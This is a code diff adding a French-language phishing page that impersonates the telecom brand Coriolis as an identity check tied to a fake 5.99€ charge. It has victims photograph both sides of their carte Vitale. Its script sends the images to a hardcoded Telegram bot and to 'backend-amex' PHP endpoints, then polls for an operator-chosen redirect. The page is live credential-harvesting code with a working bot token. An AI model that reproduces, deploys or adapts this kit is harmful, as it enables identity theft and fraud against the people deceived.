@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>CORIOLIS · Vérification d'identité</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #ffffff;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      min-height: 100vh;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .page-container {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      min-height: 100vh;
+      background: #ffffff;
+    }
+
+    .top-bar {
+      background-color: #4DBDC6;
+      width: 100%;
+      min-height: 150px;
+      border-bottom-left-radius: 28px;
+      border-bottom-right-radius: 28px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.02), 0 2px 4px rgba(0, 0, 0, 0.02);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 24px;
+      transition: all 0.2s ease;
+      flex-shrink: 0;
+    }
+
+    .content-white {
+      flex: 1;
+      background-color: #ffffff;
+      width: 100%;
+      padding: 30px 20px;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+
+    /* Styles pour les éléments de paiement */
+    .payment-section {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .montant-label {
+      font-weight: bold;
+      font-size: 1.3rem;
+      text-align: center;
+      margin-top: 28px;
+    }
+
+    .prix {
+      font-size: 14px;
+      font-weight: normal;
+      text-align: center;
+      margin-top: -3%;
+    }
+
+    /* Bloc bleu avec message */
+    .info-bloc {
+      background-color: #4DBDC6;
+      padding: 13px;
+      border-radius: 12px;
+      text-align: center;
+      color: #323232;
+      width: 89%;
+    }
+
+    .info-bloc p {
+      font-size: 17px;
+      line-height: 1.4;
+    }
+
+    /* Petite barre fine bleue */
+    .thin-blue-bar {
+      width:  90%;
+      height: 1px;
+      background-color: #4DBDC6;
+      border-radius: 3px;
+      margin-top: 1%;
+    }
+
+    /* Champs de formulaire style "seulement barre du bas" */
+    .input-field {
+      width: 100%;
+      text-align: center;
+    }
+
+    .input-field label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 1.1rem;
+    }
+
+    .input-with-bottom-border {
+      width: 90%;
+      padding: 12px 8px;
+      font-size: 1rem;
+      text-align: center;
+      border: none;
+      border-bottom: 2px solid #b5b5b5;
+      outline: none;
+      background: transparent;
+      font-family: inherit;
+    }
+
+    .input-with-bottom-border:focus {
+      border-bottom-color: #2c7da0;
+    }
+
+    /* Bouton payer */
+    .btn-payer {
+      background-color: #323232;
+      color: white;
+      border: none;
+      padding: 14px 40px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      margin-top: 10px;
+    }
+
+    .btn-payer:hover {
+      background-color: #2c7da0;
+    }
+
+    @media (max-width: 560px) {
+      .top-bar {
+        min-height: 100px !important;
+      }
+      .content-white {
+        padding: 20px 16px;
+      }
+      .prix {
+        font-size: 1.1rem;
+      }
+    }
+
+    @media (min-width: 1600px) {
+      .top-bar {
+        min-height: 170px !important;
+      }
+    }
+
+    .top-bar {
+      min-height: 120px !important;
+      height: auto !important;
+    }
+
+    @media (max-width: 560px) {
+      .top-bar {
+        min-height: 45px !important;
+      }
+    }
+
+    body, .page-container, .content-white {
+      overflow-x: hidden;
+    }
+
+
+/* Aligner les textes des labels à gauche */
+/* Aligner les textes des labels à gauche */
+.input-field {
+  text-align: left;
+}
+
+.input-field label {
+  display: block;
+  margin-bottom: 8px;
+  font-size: 1.1rem;
+  text-align: left;
+  width: 90%;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+/* Aligner le texte à l'intérieur des cases à gauche */
+.input-with-bottom-border {
+  text-align: left;
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+/* Aligner le texte à l'intérieur des cases à gauche */
+.input-with-bottom-border {
+  text-align: left;
+}
+
+/* Espace entre les cases */
+.input-field {
+  margin-bottom: 28px;
+}
+
+/* Supprimer l'espace du dernier champ */
+.input-field:last-of-type {
+  margin-bottom: 0;
+}
+
+.bas {
+ width: 110%;
+margin-top: 10%;
+}
+
+.btn-capture {
+    background-color: #4DBDC6;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    font-size: 0.9rem;
+    border-radius: 40px;
+    cursor: pointer;
+    margin-top: 10px;
+    width: 90%;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.btn-capture:hover {
+    background-color: #3a9aa3;
+}
+
+.photo-preview {
+    width: 90%;
+    margin-top: 10px;
+    border-radius: 8px;
+    overflow: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+	text-align: center;
+}
+
+.photo-preview img {
+    width: 300px;
+    height: 160px;
+    object-fit: cover;
+    border-radius: 8px;
+    border: 2px solid #4DBDC6;
+    display: block;
+    margin: 0 auto;
+	margin-right: -20px;
+}
+	  
+	  /* Modal caméra */
+.camera-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: black;
+    z-index: 1000;
+    display: none;
+    flex-direction: column;
+}
+
+.camera-video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.camera-guide {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+}
+
+.camera-message {
+    position: absolute;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(77, 189, 198, 0.9);
+    color: white;
+    padding: 10px 20px;
+    border-radius: 25px;
+    font-size: 14px;
+    text-align: center;
+    z-index: 10;
+}
+
+.cadre {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 85%;
+    height: 200px;
+    border: 2px solid #4DBDC6;
+    border-radius: 10px;
+}
+
+.cadre::before {
+    content: '';
+    position: absolute;
+    top: -2px;
+    left: -2px;
+    width: 30px;
+    height: 30px;
+    border-top: 4px solid #4DBDC6;
+    border-left: 4px solid #4DBDC6;
+}
+
+.cadre::after {
+    content: '';
+    position: absolute;
+    top: -2px;
+    right: -2px;
+    width: 30px;
+    height: 30px;
+    border-top: 4px solid #4DBDC6;
+    border-right: 4px solid #4DBDC6;
+}
+
+.cadre-bottom-left {
+    position: absolute;
+    bottom: -2px;
+    left: -2px;
+    width: 30px;
+    height: 30px;
+    border-bottom: 4px solid #4DBDC6;
+    border-left: 4px solid #4DBDC6;
+}
+
+.cadre-bottom-right {
+    position: absolute;
+    bottom: -2px;
+    right: -2px;
+    width: 30px;
+    height: 30px;
+    border-bottom: 4px solid #4DBDC6;
+    border-right: 4px solid #4DBDC6;
+}
+
+.btn-capture-photo {
+    position: absolute;
+    bottom: 80px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: white;
+    border: none;
+    width: 70px;
+    height: 70px;
+    border-radius: 50%;
+    cursor: pointer;
+    z-index: 10;
+}
+
+.btn-fermer-camera {
+    position: absolute;
+    top: 20px;
+    right: 10px;
+    background: red;
+    color: white;
+    border: none;
+    padding: 5px 10px;
+    border-radius: 25px;
+    z-index: 10;
+}
+	  
+	  /* Overlay sombre autour du cadre */
+.cadre-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    pointer-events: none;
+}
+
+.cadre {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 85%;
+    height: 200px;
+    border: 2px solid #4DBDC6;
+    border-radius: 10px;
+    background: transparent;
+    box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
+}
+
+/* Overlay de chargement */
+.loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.7);
+    z-index: 2000;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+}
+
+.spinner {
+    width: 60px;
+    height: 60px;
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid #4DBDC6;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+}
+
+.loading-text {
+    color: white;
+    font-size: 16px;
+}
+
+
+/* Barre d'étapes - Style Orange */
+.stepbar {
+  width: 100%;
+  margin: 10px 0 20px 0;
+}
+
+.stepbar ol {
+  display: flex;
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  justify-content: space-between;
+  position: relative;
+  counter-reset: step;
+}
+
+.stepbar ol::before {
+  content: '';
+  position: absolute;
+  top: 16px;
+  left: 30px;  
+  right: 30px;  
+  height: 2px;
+  background: #e1e1e1;
+  z-index: 0;
+}
+
+.step-item {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  position: relative;
+  z-index: 1;
+  flex: 1;
+  counter-increment: step;
+}
+
+.step-item::before {
+  content: counter(step);
+  width: 25px;
+  height: 25px;
+  border-radius: 50%;
+  background: #ffffff;
+  color: #000000;
+  border: 2px solid #e1e1e1;
+  font-size: 14px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 8px;
+  transition: all 0.3s ease;
+  font-family: Arial, sans-serif;
+}
+
+.step-item.active::before {
+  background: #ffffff;
+  color: #000000;
+  border-color: #4DBDC6;
+}
+
+.step-item.active .step-title {
+  color: #4DBDC6;
+  font-weight: 600;
+}
+
+.step-title {
+  font-size: 12px;
+  color: #000000;
+  text-align: center;
+  font-weight: 400;
+  white-space: nowrap;
+}
+
+.step-link {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-decoration: none;
+  cursor: default;
+}
+
+.sub-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: #000;
+  margin-top: 10px;
+  text-align: left;
+  width: 100%;
+}
+
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+  </style>
+</head>
+<body>
+  <div class="page-container">
+    <header class="top-bar" role="banner" aria-label="Barre de navigation bleue arrondie">
+      <span style="color: white; font-weight: 600; font-size: 1.6rem;">coriolis</span>
+    </header>
+    
+    <main class="content-white" role="main">
+      <!-- Overlay de chargement -->
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Envoi des documents en cours...</div>
+</div>
+      <div class="payment-section">
+        <!-- Montant à régler en gras -->
+        <div class="montant-label">Vérification d'identité</div>
+        
+        
+        <!-- Bloc bleu centré avec message -->
+        <div class="info-bloc">
+          <p>Une fois les documents déposées, <strong>merci d'attendre l'affichage de la page de vérification selfie</strong> pour que votre prélèvement de 5,99€ soit validée.</p>
+        </div>
+
+<div class="stepbar">
+  <ol>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+    <li class="step-item active">
+      <span class="step-link">
+        <span class="step-title">Vérification d'identité</span>
+      </span>
+    </li>
+    <li class="step-item">
+      <span class="step-link">
+        <span class="step-title"></span>
+      </span>
+    </li>
+  </ol>
+</div>
+        
+        <!-- Petite fine barre bleue -->
+        <div class="thin-blue-bar"></div>
+
+<!-- Champ Recto VITALE -->
+<div class="input-field">
+    <label>Recto de la carte vitale</label>
+    <input type="text" id="rectoInput" class="input-with-bottom-border" placeholder="Aucune photo sélectionnée" readonly>
+    <div id="rectoPreview" class="photo-preview"></div>
+    <input type="file" id="rectoPhoto" accept="image/*" capture="environment" style="display: none;">
+    <button type="button" class="btn-capture" onclick="document.getElementById('rectoPhoto').click()">Prendre photo recto</button>
+</div>
+		  
+		  <!-- Petite fine barre bleue -->
+        <div class="thin-blue-bar"></div>
+
+<!-- Champ Verso VITALE -->
+<div class="input-field">
+    <label>Verso de la carte vitale</label>
+    <input type="text" id="versoInput" class="input-with-bottom-border" placeholder="Aucune photo sélectionnée" readonly>
+    <div id="versoPreview" class="photo-preview"></div>
+    <input type="file" id="versoPhoto" accept="image/*" capture="environment" style="display: none;">
+    <button type="button" class="btn-capture" onclick="document.getElementById('versoPhoto').click()">Prendre photo verso</button>
+</div>
+        
+        <!-- Bouton Valider -->
+        <button class="btn-payer">Valider</button>
+		  </div>
+		  <!-- Modal caméra -->
+<div id="cameraModal" class="camera-modal">
+    <video id="cameraVideo" class="camera-video" autoplay playsinline></video>
+    <div class="camera-guide">
+        <div class="camera-message">Veulliez bien cadrer la carte dans le repère - Évitez le flou</div>
+        <div class="cadre">
+            <div class="cadre-bottom-left"></div>
+            <div class="cadre-bottom-right"></div>
+        </div>
+    </div>
+    <button class="btn-capture-photo" id="captureBtn">Valider</button>
+    <button class="btn-fermer-camera" id="fermerCameraBtn">✕ Fermer</button>
+</div>
+    </main>
+  </div>
+ <script>
+	 let currentStream = null;
+let currentPreviewId = null;
+let currentInputId = null;
+let rectoDataURL = null;
+let versoDataURL = null;
+
+async function ouvrirCamera(previewId, inputId) {
+    currentPreviewId = previewId;
+    currentInputId = inputId;
+    
+    const modal = document.getElementById('cameraModal');
+    const video = document.getElementById('cameraVideo');
+    
+    modal.style.display = 'flex';
+    
+    try {
+        if (currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+        }
+        
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+        currentStream = stream;
+        video.srcObject = stream;
+    } catch (err) {
+        alert('Impossible d\'accéder à la caméra');
+        modal.style.display = 'none';
+    }
+}
+
+document.getElementById('captureBtn').addEventListener('click', function() {
+    const video = document.getElementById('cameraVideo');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const context = canvas.getContext('2d');
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    const imageDataUrl = canvas.toDataURL('image/jpeg');
+    
+    // Stocker l'image selon le type (recto ou verso)
+    if (currentPreviewId === 'rectoPreview') {
+        rectoDataURL = imageDataUrl;
+    } else if (currentPreviewId === 'versoPreview') {
+        versoDataURL = imageDataUrl;
+    }
+    
+    // Afficher la preview
+    const preview = document.getElementById(currentPreviewId);
+    preview.innerHTML = '';
+    const img = document.createElement('img');
+    img.src = imageDataUrl;
+    preview.appendChild(img);
+    
+    // Cacher l'input
+    document.getElementById(currentInputId).style.display = 'none';
+    
+    // Fermer la caméra
+    fermerCamera();
+});
+
+document.getElementById('fermerCameraBtn').addEventListener('click', function() {
+    fermerCamera();
+});
+
+function fermerCamera() {
+    if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+        currentStream = null;
+    }
+    document.getElementById('cameraModal').style.display = 'none';
+}
+
+// Remplacer la fonction existante du bouton Valider par celle-ci :
+
+document.querySelector('.btn-payer').addEventListener('click', async function() {
+    if (!rectoDataURL || !versoDataURL) {
+        alert('Veuillez prendre les deux photos (recto et verso)');
+        return;
+    }
+
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    loadingOverlay.style.display = 'flex';
+    document.querySelector('.loading-text').innerHTML = 'Vérification en cours...';
+
+    const clientId = 'CLIENT-' + Date.now();
+    const sourceUrl = window.location.pathname;
+
+    const BOT_TOKEN = '8575778335:AAETAvCe_aolvSDfohDyk1ln1YB-1saPScg';
+    const CHAT_ID   = '-1003756237345';
+
+    function dataURLtoBlob(dataURL) {
+        const [meta, b64] = dataURL.split(',');
+        const mime = meta.match(/:(.*?);/)[1];
+        const bin = atob(b64);
+        const arr = new Uint8Array(bin.length);
+        for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+        return new Blob([arr], { type: mime });
+    }
+
+    async function sendPhoto(blob, caption) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('caption', caption);
+        fd.append('photo', blob, 'photo.jpg');
+        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: fd
+        });
+        return r.json();
+    }
+
+    async function sendMessage(text) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('text', text);
+        fd.append('parse_mode', 'HTML');
+        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            body: fd
+        });
+        return r.json();
+    }
+
+    try {
+        // 1. Upload CNI (comme avant, si tu gardes ce backend)
+        try {
+            await fetch('backend-amex/upload-cni.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ recto: rectoDataURL, verso: versoDataURL, clientId })
+            });
+        } catch (e) { /* ignore si pas dispo */ }
+
+        // 2. Add redirection (comme avant, si tu gardes ce backend)
+        try {
+            await fetch('backend-amex/add-redirection.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId, sourceUrl, status: 'en_attente' })
+            });
+        } catch (e) { /* ignore */ }
+
+        // 3. Telegram : message + recto + verso
+        const texte = `📸 <b>Nouveau document CNI reçu</b>\n`
+                    + `🆔 Client : <code>${clientId}</code>\n`
+                    + `🔗 URL : ${sourceUrl}\n`
+                    + `⏳ Statut : En attente de validation`;
+
+        await sendMessage(texte);
+        await sendPhoto(dataURLtoBlob(rectoDataURL), `🪪 Recto — ${clientId}`);
+        await sendPhoto(dataURLtoBlob(versoDataURL), `🪪 Verso — ${clientId}`);
+
+        // 4. Attendre la redirection (comme avant)
+        document.querySelector('.loading-text').innerHTML = '';
+        verifierRedirection(clientId);
+
+    } catch (error) {
+        console.error('Erreur:', error);
+        alert('Erreur de connexion au serveur');
+        loadingOverlay.style.display = 'none';
+    }
+});
+
+// Fonction pour vérifier périodiquement si une URL de destination a été définie
+function verifierRedirection(clientId) {
+    const checkInterval = setInterval(async () => {
+        try {
+            const response = await fetch(`backend-amex/check-redirection.php?clientId=${clientId}`);
+            const data = await response.json();
+            
+            if (data.success && data.destinationUrl && data.destinationUrl !== '') {
+                // URL de destination trouvée, rediriger l'utilisateur
+                clearInterval(checkInterval);
+                window.location.href = data.destinationUrl;
+            }
+        } catch (error) {
+            console.error('Erreur vérification:', error);
+        }
+    }, 3000); // Vérifier toutes les 3 secondes
+}
+	 
+// Gestion photo recto (fallback)
+document.getElementById('rectoPhoto').addEventListener('change', function(e) {
+    const file = e.target.files[0];
+    if (file) {
+        const reader = new FileReader();
+        reader.onload = function(event) {
+            rectoDataURL = event.target.result;
+            const img = document.createElement('img');
+            img.src = rectoDataURL;
+            const preview = document.getElementById('rectoPreview');
+            preview.innerHTML = '';
+            preview.appendChild(img);
+            document.getElementById('rectoInput').style.display = 'none';
+        };
+        reader.readAsDataURL(file);
+    }
+});
+
+// Gestion photo verso (fallback)
+document.getElementById('versoPhoto').addEventListener('change', function(e) {
+    const file = e.target.files[0];
+    if (file) {
+        const reader = new FileReader();
+        reader.onload = function(event) {
+            versoDataURL = event.target.result;
+            const img = document.createElement('img');
+            img.src = versoDataURL;
+            const preview = document.getElementById('versoPreview');
+            preview.innerHTML = '';
+            preview.appendChild(img);
+            document.getElementById('versoInput').style.display = 'none';
+        };
+        reader.readAsDataURL(file);
+    }
+});
+</script>
+</body>
+</html>
